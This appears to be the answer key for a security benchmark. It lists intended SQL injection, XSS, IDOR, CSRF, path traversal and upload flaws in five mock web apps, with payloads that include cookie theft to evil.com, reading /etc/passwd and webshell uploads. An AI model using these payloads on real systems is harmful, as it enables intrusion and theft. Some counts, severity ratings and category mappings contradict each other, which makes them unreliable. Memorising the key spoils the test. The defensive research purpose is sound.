# Ground Truth Vulnerabilities Database

## Research Foundation: Complete Vulnerability Inventory

This document provides the authoritative ground truth database of all vulnerabilities present in the 5 mock target applications. Each vulnerability is verified through source code analysis and manual testing.

## 📊 Vulnerability Statistics

### Overall Statistics

| Application | Total Vulnerabilities | Critical | High | Medium | Low |
|-------------|----------------------|----------|------|--------|-----|
| E-Commerce | 11 | 3 | 4 | 3 | 1 |
| Social Media | 14 | 4 | 6 | 3 | 1 |
| Banking | 2 | 1 | 1 | 0 | 0 |
| Blog | 2 | 0 | 1 | 1 | 0 |
| File Share | 4 | 2 | 1 | 1 | 0 |
| **Total** | **33** | **10** | **13** | **8** | **2** |

### Vulnerability Type Distribution

| Vulnerability Type | Count | Percentage | Examples |
|-------------------|-------|------------|----------|
| IDOR | 9 | 27% | User ID manipulation |
| SQL Injection | 3 | 9% | Database query injection |
| XSS (Stored) | 4 | 12% | Persistent cross-site scripting |
| XSS (Reflected) | 2 | 6% | Reflected cross-site scripting |
| File Upload | 2 | 6% | Unrestricted file upload |
| Path Traversal | 2 | 6% | Directory traversal |
| Mass Assignment | 1 | 3% | Over-posting vulnerability |
| Business Logic | 4 | 12% | Application logic flaws |
| CSRF | 2 | 6% | Cross-site request forgery |
| Weak Password | 1 | 3% | Insufficient password policy |
| Session Fixation | 1 | 3% | Session ID not regenerated |
| Weak Reset Token | 1 | 3% | Predictable reset tokens |
| Info Disclosure | 1 | 3% | Sensitive data leakage |

---

## 🎯 Detailed Vulnerability Analysis

## 1. E-Commerce Platform (Port 5002)

**File:** `env/target_app_ecommerce.py`
**URL:** http://localhost:5002
**Complexity:** High (11 vulnerabilities)

### Authentication & Authorization

#### 1.1 Mass Assignment (Critical)
- **CVE-like ID:** EC-001
- **OWASP Category:** A04:2021 - Insecure Design
- **Endpoint:** `/api/register`
- **Method:** POST
- **Parameters:** `role`, `balance`
- **Description:** User registration allows setting arbitrary `role` and `balance` values
- **Impact:** Users can register as administrators or with unlimited funds
- **Exploitation:** `{"username": "hacker", "password": "pass", "role": "admin", "balance": 999999}`
- **CVSS Score:** 9.1 (Critical)
- **Difficulty:** Low

#### 1.2 SQL Injection - Login (Critical)
- **CVE-like ID:** EC-002
- **OWASP Category:** A03:2021 - Injection
- **Endpoint:** `/api/login`
- **Method:** POST
- **Parameters:** `password`
- **Description:** Login query vulnerable to SQL injection
- **Impact:** Authentication bypass, data extraction
- **Exploitation:** `' OR '1'='1' --`
- **CVSS Score:** 9.8 (Critical)
- **Difficulty:** Low

#### 1.3 SQL Injection - Search (High)
- **CVE-like ID:** EC-003
- **OWASP Category:** A03:2021 - Injection
- **Endpoint:** `/api/products`
- **Method:** GET
- **Parameters:** `search`
- **Description:** Product search query vulnerable to SQL injection
- **Impact:** Database data extraction, potential code execution
- **Exploitation:** `' UNION SELECT username,password FROM users --`
- **CVSS Score:** 8.6 (High)
- **Difficulty:** Medium

### Access Control

#### 1.4 IDOR - Product Update (High)
- **CVE-like ID:** EC-004
- **OWASP Category:** A01:2021 - Broken Access Control
- **Endpoint:** `/api/products/<id>`
- **Method:** PUT
- **Parameters:** `product_id`
- **Description:** Unauthenticated users can update any product's price/stock
- **Impact:** Price manipulation, stock manipulation
- **Exploitation:** PUT to `/api/products/1` with modified price
- **CVSS Score:** 8.2 (High)
- **Difficulty:** Low

#### 1.5 IDOR - Order Access (High)
- **CVE-like ID:** EC-005
- **OWASP Category:** A01:2021 - Broken Access Control
- **Endpoint:** `/api/orders/<id>`
- **Method:** GET
- **Parameters:** `order_id`
- **Description:** Authentication bypass allows viewing any user's orders
- **Impact:** Privacy violation, data leakage
- **Exploitation:** Access `/api/orders/1` without authentication
- **CVSS Score:** 7.5 (High)
- **Difficulty:** Low

#### 1.6 Broken Access Control - Admin (High)
- **CVE-like ID:** EC-006
- **OWASP Category:** A01:2021 - Broken Access Control
- **Endpoint:** `/api/admin/users`
- **Method:** GET
- **Parameters:** None
- **Description:** Administrative endpoint accessible without admin check
- **Impact:** User data enumeration, administrative access
- **Exploitation:** Direct access to admin-only endpoint
- **CVSS Score:** 8.2 (High)
- **Difficulty:** Low

### Business Logic Flaws

#### 1.7 Negative Quantity (Medium)
- **CVE-like ID:** EC-007
- **OWASP Category:** A07:2021 - Identification & Auth Failure
- **Endpoint:** `/api/cart/add`
- **Method:** POST
- **Parameters:** `quantity`
- **Description:** Cart accepts negative quantities, reducing total
- **Impact:** Free items, negative cart totals
- **Exploitation:** `{"product_id": 1, "quantity": -10}`
- **CVSS Score:** 6.5 (Medium)
- **Difficulty:** Low

#### 1.8 Race Condition - Coupons (Medium)
- **CVE-like ID:** EC-008
- **OWASP Category:** A07:2021 - Identification & Auth Failure
- **Endpoint:** `/api/checkout`
- **Method:** POST
- **Parameters:** `coupon_code`
- **Description:** Coupon usage count updated after discount application
- **Impact:** Unlimited coupon usage
- **Exploitation:** Rapid concurrent coupon usage requests
- **CVSS Score:** 6.8 (Medium)
- **Difficulty:** High

#### 1.9 Client-Side Price Manipulation (Medium)
- **CVE-like ID:** EC-009
- **OWASP Category:** A07:2021 - Identification & Auth Failure
- **Endpoint:** `/api/checkout`
- **Method:** POST
- **Parameters:** `items`
- **Description:** Checkout uses client-provided prices
- **Impact:** Price manipulation, free purchases
- **Exploitation:** Modify item prices in request body
- **CVSS Score:** 6.5 (Medium)
- **Difficulty:** Low

### Payment & Information Disclosure

#### 1.10 Payment Bypass (Medium)
- **CVE-like ID:** EC-010
- **OWASP Category:** A07:2021 - Identification & Auth Failure
- **Endpoint:** `/api/payment/process`
- **Method:** POST
- **Parameters:** `amount`
- **Description:** Accepts negative or zero payment amounts
- **Impact:** Free purchases, payment bypass
- **Exploitation:** `{"amount": -100}`
- **CVSS Score:** 6.5 (Medium)
- **Difficulty:** Low

#### 1.11 Information Disclosure (Low)
- **CVE-like ID:** EC-011
- **OWASP Category:** A02:2021 - Cryptographic Failures
- **Endpoint:** `/api/admin/stats`
- **Method:** GET
- **Parameters:** None
- **Description:** Leaks `secret_key` and `jwt_secret` in response
- **Impact:** Cryptographic key compromise
- **Exploitation:** Access admin stats endpoint
- **CVSS Score:** 5.3 (Medium)
- **Difficulty:** Low

---

## 2. Social Media Platform (Port 5003)

**File:** `env/target_app_social.py`
**URL:** http://localhost:5003
**Complexity:** High (14 vulnerabilities)

### Authentication & Password Management

#### 2.1 Weak Password Policy (High)
- **CVE-like ID:** SM-001
- **OWASP Category:** A02:2021 - Cryptographic Failures
- **Endpoint:** `/api/register`
- **Method:** POST
- **Parameters:** `password`
- **Description:** No password complexity requirements
- **Impact:** Weak authentication, brute force susceptibility
- **Exploitation:** Register with "password" or "123456"
- **CVSS Score:** 7.4 (High)
- **Difficulty:** Low

#### 2.2 Session Fixation (High)
- **CVE-like ID:** SM-002
- **OWASP Category:** A07:2021 - Identification & Auth Failure
- **Endpoint:** `/api/login`
- **Method:** POST
- **Parameters:** None
- **Description:** Session ID not regenerated upon login
- **Impact:** Session hijacking, account takeover
- **Exploitation:** Set session cookie before login, retain after login
- **CVSS Score:** 8.1 (High)
- **Difficulty:** Medium

#### 2.3 Weak Password Reset Token (High)
- **CVE-like ID:** SM-003
- **OWASP Category:** A07:2021 - Identification & Auth Failure
- **Endpoint:** `/api/password-reset`
- **Method:** POST
- **Parameters:** `email`
- **Description:** Reset token is predictable (user ID)
- **Impact:** Unauthorized password resets
- **Exploitation:** Guess user ID and reset any password
- **CVSS Score:** 8.2 (High)
- **Difficulty:** Low

### Access Control (IDOR)

#### 2.4 IDOR - Profile View (Critical)
- **CVE-like ID:** SM-004
- **OWASP Category:** A01:2021 - Broken Access Control
- **Endpoint:** `/api/profile/<id>`
- **Method:** GET
- **Parameters:** `user_id`
- **Description:** Can view private profiles of any user
- **Impact:** Privacy violation, personal data exposure
- **Exploitation:** Access `/api/profile/2` when logged in as user 1
- **CVSS Score:** 9.1 (Critical)
- **Difficulty:** Low

#### 2.5 IDOR - Profile Edit (Critical)
- **CVE-like ID:** SM-005
- **OWASP Category:** A01:2021 - Broken Access Control
- **Endpoint:** `/api/profile/<id>`
- **Method:** PUT
- **Parameters:** `user_id`
- **Description:** Can edit any user's profile
- **Impact:** Account takeover, data manipulation
- **Exploitation:** PUT to `/api/profile/2` when logged in as user 1
- **CVSS Score:** 9.8 (Critical)
- **Difficulty:** Low

#### 2.6 IDOR - Post Deletion (High)
- **CVE-like ID:** SM-006
- **OWASP Category:** A01:2021 - Broken Access Control
- **Endpoint:** `/api/posts/<id>`
- **Method:** DELETE
- **Parameters:** `post_id`
- **Description:** Unauthenticated users can delete any post
- **Impact:** Content destruction, denial of service
- **Exploitation:** DELETE `/api/posts/1` without authentication
- **CVSS Score:** 7.5 (High)
- **Difficulty:** Low

#### 2.7 IDOR - Private Messages (High)
- **CVE-like ID:** SM-007
- **OWASP Category:** A01:2021 - Broken Access Control
- **Endpoint:** `/api/messages/<id>`
- **Method:** GET
- **Parameters:** `user_id`
- **Description:** Can read any user's private messages
- **Impact:** Message privacy violation
- **Exploitation:** Access `/api/messages/2` when logged in as user 1
- **CVSS Score:** 7.5 (High)
- **Difficulty:** Low

### Injection Vulnerabilities

#### 2.8 Stored XSS - Posts (Critical)
- **CVE-like ID:** SM-008
- **OWASP Category:** A03:2021 - Injection
- **Endpoint:** `/api/posts`
- **Method:** POST
- **Parameters:** `content`
- **Description:** Post content not sanitized, stored XSS
- **Impact:** Persistent XSS, account compromise, data theft
- **Exploitation:** `<script>alert(document.cookie)</script>`
- **CVSS Score:** 9.6 (Critical)
- **Difficulty:** Low

#### 2.9 Reflected XSS - Comments Search (High)
- **CVE-like ID:** SM-009
- **OWASP Category:** A03:2021 - Injection
- **Endpoint:** `/api/posts/<id>/comments`
- **Method:** GET
- **Parameters:** `search`
- **Description:** Search term reflected in JSON without escaping
- **Impact:** Reflected XSS attacks
- **Exploitation:** `"><script>alert(1)</script>`
- **CVSS Score:** 7.4 (High)
- **Difficulty:** Low

#### 2.10 Stored XSS - Comments (High)
- **CVE-like ID:** SM-010
- **OWASP Category:** A03:2021 - Injection
- **Endpoint:** `/api/posts/<id>/comments`
- **Method:** POST
- **Parameters:** `content`
- **Description:** Comment content not sanitized
- **Impact:** Persistent XSS in comments
- **Exploitation:** `<script>stealCookies()</script>`
- **CVSS Score:** 8.2 (High)
- **Difficulty:** Low

#### 2.11 Stored XSS - Messages (High)
- **CVE-like ID:** SM-011
- **OWASP Category:** A03:2021 - Injection
- **Endpoint:** `/api/messages/send`
- **Method:** POST
- **Parameters:** `content`
- **Description:** Message content not sanitized
- **Impact:** XSS in private messages
- **Exploitation:** `<img src=x onerror=alert(1)>`
- **CVSS Score:** 7.4 (High)
- **Difficulty:** Low

### File Upload & Path Traversal

#### 2.12 Unrestricted File Upload (Critical)
- **CVE-like ID:** SM-012
- **OWASP Category:** A01:2021 - Broken Access Control
- **Endpoint:** `/api/upload`
- **Method:** POST
- **Parameters:** `file`
- **Description:** File upload with insufficient validation
- **Impact:** Code execution, malware distribution
- **Exploitation:** Upload `shell.php.jpg` (double extension bypass)
- **CVSS Score:** 9.8 (Critical)
- **Difficulty:** Medium

#### 2.13 Path Traversal (High)
- **CVE-like ID:** SM-013
- **OWASP Category:** A01:2021 - Broken Access Control
- **Endpoint:** `/uploads/<filename>`
- **Method:** GET
- **Parameters:** `filename`
- **Description:** No directory traversal prevention
- **Impact:** Arbitrary file access
- **Exploitation:** `/uploads/../../../etc/passwd`
- **CVSS Score:** 7.5 (High)
- **Difficulty:** Low

### CSRF & SQL Injection

#### 2.14 CSRF - Friend Requests (Medium)
- **CVE-like ID:** SM-014
- **OWASP Category:** A01:2021 - Broken Access Control
- **Endpoint:** `/api/friends/add`
- **Method:** POST
- **Parameters:** `friend_id`
- **Description:** No CSRF token protection on friend requests
- **Impact:** Forced friend requests, spam
- **Exploitation:** Cross-site request forgery
- **CVSS Score:** 6.5 (Medium)
- **Difficulty:** Medium

#### 2.15 SQL Injection - Search (Low)
- **CVE-like ID:** SM-015
- **OWASP Category:** A03:2021 - Injection
- **Endpoint:** `/api/search`
- **Method:** GET
- **Parameters:** `q`
- **Description:** Search query vulnerable to SQL injection
- **Impact:** Data extraction, potential code execution
- **Exploitation:** `' UNION SELECT username,password FROM users --`
- **CVSS Score:** 8.6 (High)
- **Difficulty:** Medium

---

## 3. Banking Application (Port 5004)

**File:** `env/target_app_banking.py`
**URL:** http://localhost:5004
**Complexity:** Medium (2 vulnerabilities)

### Authentication & Authorization

#### 3.1 CSRF - Money Transfer (Critical)
- **CVE-like ID:** BA-001
- **OWASP Category:** A01:2021 - Broken Access Control
- **Endpoint:** `/transfer`
- **Method:** POST
- **Parameters:** None
- **Description:** No CSRF token on money transfer form
- **Impact:** Unauthorized money transfers, financial loss
- **Exploitation:** `<form action="http://bank/transfer" method="POST"><input name="amount" value="1000"><input name="to_account" value="attacker"></form>`
- **CVSS Score:** 9.8 (Critical)
- **Difficulty:** Low

#### 3.2 IDOR - Account Transfer (High)
- **CVE-like ID:** BA-002
- **OWASP Category:** A01:2021 - Broken Access Control
- **Endpoint:** `/transfer`
- **Method:** POST
- **Parameters:** `to_account`
- **Description:** Can transfer money to any account number
- **Impact:** Unauthorized transfers between accounts
- **Exploitation:** Transfer to arbitrary account numbers
- **CVSS Score:** 8.2 (High)
- **Difficulty:** Low

---

## 4. Blog Platform (Port 5005)

**File:** `env/target_app_blog.py`
**URL:** http://localhost:5005
**Complexity:** Low (2 vulnerabilities)

### Content Injection

#### 4.1 Stored XSS - Blog Posts (High)
- **CVE-like ID:** BL-001
- **OWASP Category:** A03:2021 - Injection
- **Endpoint:** `/new-post`
- **Method:** POST
- **Parameters:** `content`
- **Description:** Blog post content not sanitized
- **Impact:** Persistent XSS, reader compromise
- **Exploitation:** `<script>document.location='http://evil.com?c='+document.cookie</script>`
- **CVSS Score:** 8.2 (High)
- **Difficulty:** Low

#### 4.2 Stored XSS - Comments (Medium)
- **CVE-like ID:** BL-002
- **OWASP Category:** A03:2021 - Injection
- **Endpoint:** `/post/<id>/comment`
- **Method:** POST
- **Parameters:** `content`
- **Description:** Comment content not sanitized
- **Impact:** XSS in blog comments
- **Exploitation:** `<img src=x onerror=alert('XSS')>`
- **CVSS Score:** 6.1 (Medium)
- **Difficulty:** Low

---

## 5. File Sharing Platform (Port 5006)

**File:** `env/target_app_fileshare.py`
**URL:** http://localhost:5006
**Complexity:** Medium (4 vulnerabilities)

### File Upload & Access

#### 5.1 Unrestricted File Upload (Critical)
- **CVE-like ID:** FS-001
- **OWASP Category:** A01:2021 - Broken Access Control
- **Endpoint:** `/upload`
- **Method:** POST
- **Parameters:** `file`
- **Description:** Completely unrestricted file upload
- **Impact:** Code execution, malware hosting
- **Exploitation:** Upload `webshell.php`, `malware.exe`, etc.
- **CVSS Score:** 9.8 (Critical)
- **Difficulty:** Low

#### 5.2 IDOR - File Download (High)
- **CVE-like ID:** FS-002
- **OWASP Category:** A01:2021 - Broken Access Control
- **Endpoint:** `/download/<id>`
- **Method:** GET
- **Parameters:** `file_id`
- **Description:** Can download any uploaded file by ID
- **Impact:** Unauthorized file access, data leakage
- **Exploitation:** Access `/download/1` to download any file
- **CVSS Score:** 7.5 (High)
- **Difficulty:** Low

#### 5.3 Path Traversal - File Access (High)
- **CVE-like ID:** FS-003
- **OWASP Category:** A01:2021 - Broken Access Control
- **Endpoint:** `/download/<id>`
- **Method:** GET
- **Parameters:** `filepath`
- **Description:** Vulnerable `send_file` implementation
- **Impact:** Access to any file on server
- **Exploitation:** `/download/1?filepath=../../../etc/passwd`
- **CVSS Score:** 8.6 (High)
- **Difficulty:** Low

#### 5.4 IDOR - File Deletion (Medium)
- **CVE-like ID:** FS-004
- **OWASP Category:** A01:2021 - Broken Access Control
- **Endpoint:** `/delete/<id>`
- **Method:** GET
- **Parameters:** `file_id`
- **Description:** Can delete any file by ID
- **Impact:** Data destruction, denial of service
- **Exploitation:** DELETE `/delete/1` to delete any file
- **CVSS Score:** 6.5 (Medium)
- **Difficulty:** Low

---

## 📊 Research Analysis Framework

### Vulnerability Detection Difficulty

| Difficulty Level | Characteristics | Examples | Expected Agent Success Rate |
|------------------|----------------|----------|-----------------------------|
| **Low** | Direct endpoint access, no complex logic | IDOR, basic XSS | > 95% |
| **Medium** | Requires specific payloads, parameter manipulation | SQLi, file upload bypass | 70-90% |
| **High** | Race conditions, complex state manipulation | Coupon race, session fixation | 50-70% |

### Vulnerability Type Success Rates

| Vulnerability Type | Total Instances | Expected Detection Rate | Difficulty Reason |
|-------------------|-----------------|-------------------------|-------------------|
| IDOR | 9 | High (90%+) | Simple endpoint enumeration |
| SQL Injection | 3 | Medium (75%) | Requires payload knowledge |
| XSS (Stored) | 4 | High (85%) | Pattern recognition |
| XSS (Reflected) | 2 | Medium (70%) | Input reflection detection |
| File Upload | 2 | Low (60%) | Complex validation bypass |
| Business Logic | 4 | Medium (65%) | Requires understanding app logic |
| CSRF | 2 | Low (40%) | Cross-origin request detection |
| Path Traversal | 2 | Medium (70%) | Directory traversal patterns |

### Research Metrics

#### Primary Metrics
- **True Positive Rate:** Vulnerabilities correctly identified
- **False Positive Rate:** Non-existent vulnerabilities reported
- **Detection Coverage:** Percentage of vulnerability types found
- **Scan Efficiency:** Vulnerabilities found per minute

#### Secondary Metrics
- **Endpoint Discovery Rate:** How well agent finds all endpoints
- **Action Efficiency:** Useful actions vs. total actions
- **Convergence Speed:** Training episodes to reach baseline performance
- **Generalization:** Performance across different applications

### Evaluation Methodology

1. **Ground Truth Comparison:** Compare agent findings with this database
2. **Precision Calculation:** TP / (TP + FP) for each vulnerability type
3. **Recall Calculation:** TP / (TP + FN) for each vulnerability type
4. **F1-Score:** Harmonic mean of precision and recall
5. **Statistical Analysis:** Confidence intervals, significance testing

---

## 🔍 Validation Methodology

### Manual Verification Process

Each vulnerability was verified through:

1. **Source Code Analysis:** Review of application code
2. **Manual Testing:** Direct exploitation attempts
3. **Payload Testing:** Various attack vectors tested
4. **Edge Case Testing:** Boundary conditions explored
5. **Documentation:** Detailed exploitation steps recorded

### Validation Criteria

- **Exploitable:** Must be demonstrably exploitable
- **Realistic:** Based on real-world vulnerability patterns
- **Educational:** Suitable for research and learning
- **Isolated:** Each vulnerability independently testable

### Research Applications

This ground truth database enables:

1. **Agent Training Validation:** Verify agent learns correct patterns
2. **Performance Benchmarking:** Compare different algorithms
3. **False Positive Analysis:** Identify agent over-detection
4. **Research Reproducibility:** Standardized test environment
5. **Educational Resources:** Teaching cybersecurity concepts

---

**Database Version:** 1.0
**Last Updated:** 2025-01-XX
**Validation Status:** ✅ All vulnerabilities verified and exploitable
**Research Ready:** ✅ Complete ground truth established